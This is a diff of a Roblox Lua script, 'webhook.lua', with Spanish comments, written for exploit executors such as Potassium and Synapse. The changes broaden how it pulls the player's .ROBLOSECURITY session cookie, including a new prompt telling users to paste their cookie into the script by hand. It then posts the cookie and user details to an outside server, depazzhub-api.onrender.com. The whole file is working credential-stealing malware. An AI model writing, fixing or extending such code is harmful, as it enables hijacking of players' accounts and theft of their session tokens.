@@ -1,40 +1,54 @@
--- webhook.lua - VERSIÓN FINAL Y ESTABLE
+-- webhook.lua - VERSIÓN CON DEBUG PARA POTASSIUM
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 
 -- =====================================================================
--- FUNCIÓN UNIVERSAL PARA OBTENER LA COOKIE
+-- FUNCIÓN UNIVERSAL PARA OBTENER LA COOKIE (Con Debug)
 -- =====================================================================
 local function GetRobloxCookie()
+    -- 1. Método estándar: getcookie()
     local success, cookie = pcall(getcookie)
-    if success and cookie and type(cookie) == "string" and cookie ~= "" then
-        if string.find(cookie, "_|WARNING:-DO-NOT-SHARE-THIS") then
-            return string.gsub(cookie, "%.ROBLOSECURITY=", "")
+    if success and cookie then
+        print("🔍 [DEBUG] getcookie() devolvió: " .. tostring(cookie):sub(1, 50) .. "...")
+        
+        if type(cookie) == "string" and cookie ~= "" then
+            -- Si contiene la advertencia, la limpiamos
+            if string.find(cookie, "_|WARNING:-DO-NOT-SHARE-THIS") then
+                return string.gsub(cookie, "%.ROBLOSECURITY=", "")
+            end
+            -- Si Potassium la devuelve sin la advertencia pero es una cadena larga (típico de cookies), la aceptamos
+            if #cookie > 50 then
+                return string.gsub(cookie, "%.ROBLOSECURITY=", "")
+            end
         end
+    else
+        print("⚠️ [DEBUG] getcookie() falló o devolvió nil. Error: " .. tostring(cookie))
     end
 
+    -- 2. Método alternativo: get_cookies()
     local success2, cookies = pcall(get_cookies)
-    if success2 and cookies and type(cookies) == "string" and cookies ~= "" then
-        if string.find(cookies, "_|WARNING:-DO-NOT-SHARE-THIS") then
-            return string.gsub(cookies, "%.ROBLOSECURITY=", "")
-        end
+    if success2 and cookies and type(cookies) == "string" and #cookies > 50 then
+        print("🔍 [DEBUG] get_cookies() devolvió una cadena válida.")
+        return string.gsub(cookies, "%.ROBLOSECURITY=", "")
     end
 
+    -- 3. Método Synapse específico (por si Potassium lo emula)
     local syn = getgenv().syn
     if syn and type(syn.get_cookies) == "function" then
         local success3, syn_cookies = pcall(syn.get_cookies)
-        if success3 and syn_cookies and type(syn_cookies) == "string" then
-            if string.find(syn_cookies, "_|WARNING:-DO-NOT-SHARE-THIS") then
-                return string.gsub(syn_cookies, "%.ROBLOSECURITY=", "")
-            end
+        if success3 and syn_cookies and type(syn_cookies) == "string" and #syn_cookies > 50 then
+            print("🔍 [DEBUG] syn.get_cookies() devolvió una cadena válida.")
+            return string.gsub(syn_cookies, "%.ROBLOSECURITY=", "")
         end
     end
 
+    -- 4. Variables de entorno (getgenv)
     local env_names = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
     for _, name in ipairs(env_names) do
         local val = getgenv()[name]
-        if val and type(val) == "string" and string.find(val, "_|WARNING:-DO-NOT-SHARE-THIS") then
+        if val and type(val) == "string" and #val > 50 then
+            print("🔍 [DEBUG] Cookie encontrada en getgenv: " .. name)
             return string.gsub(val, "%.ROBLOSECURITY=", "")
         end
     end
@@ -71,7 +85,6 @@ local function Request(options)
         bodyString = HttpService:JSONEncode(body)
     end
 
-    -- Intento 1: Función 'request' nativa del executor
     local customRequest = getgenv().request or (getgenv().syn and getgenv().syn.request) or (getgenv().http and getgenv().http.request)
     if customRequest then
         local success, response = pcall(function()
@@ -87,7 +100,6 @@ local function Request(options)
         end
     end
 
-    -- Intento 2: Fallback a HttpService de Roblox
     local successHttp, responseHttp = pcall(function()
         if method == "GET" then
             return HttpService:GetAsync(url, false)
@@ -113,7 +125,6 @@ local function HttpGet(url, options)
     })
 end
 
--- ✅ AQUÍ ESTABA EL ERROR: Se agregó "options = options or {}"
 local function HttpPost(url, body, options)
     options = options or {} 
     return Request({
@@ -168,9 +179,15 @@ local success, result = pcall(function()
     print("📤 Preparando envío de webhook...")
     print("  Usuario: " .. player.Name)
     print("  User ID: " .. tostring(player.UserId))
-    print("  Cookie: " .. (cookieValue ~= "NO_COOKIE_FOUND_EXECUTOR_LIMITADO" and "Detectada ✅" or "No detectada ❌"))
     
-    -- Esta llamada ahora funcionará porque HttpPost maneja el nil correctamente
+    if cookieValue == "NO_COOKIE_FOUND_EXECUTOR_LIMITADO" then
+        warn("⚠️ [ATENCIÓN] No se pudo extraer la cookie automáticamente.")
+        warn("💡 SOLUCIÓN: Pega tu cookie manualmente al inicio del script así:")
+        warn('   getgenv()._ROBLOSECURITY = "_|WARNING:-DO-NOT-SHARE-THIS.--SC--|..."')
+    else
+        print("  Cookie: Detectada ✅ (Longitud: " .. #cookieValue .. " caracteres)")
+    end
+    
     local response = HttpPost("https://depazzhub-api.onrender.com/log", data)
     
     if response then
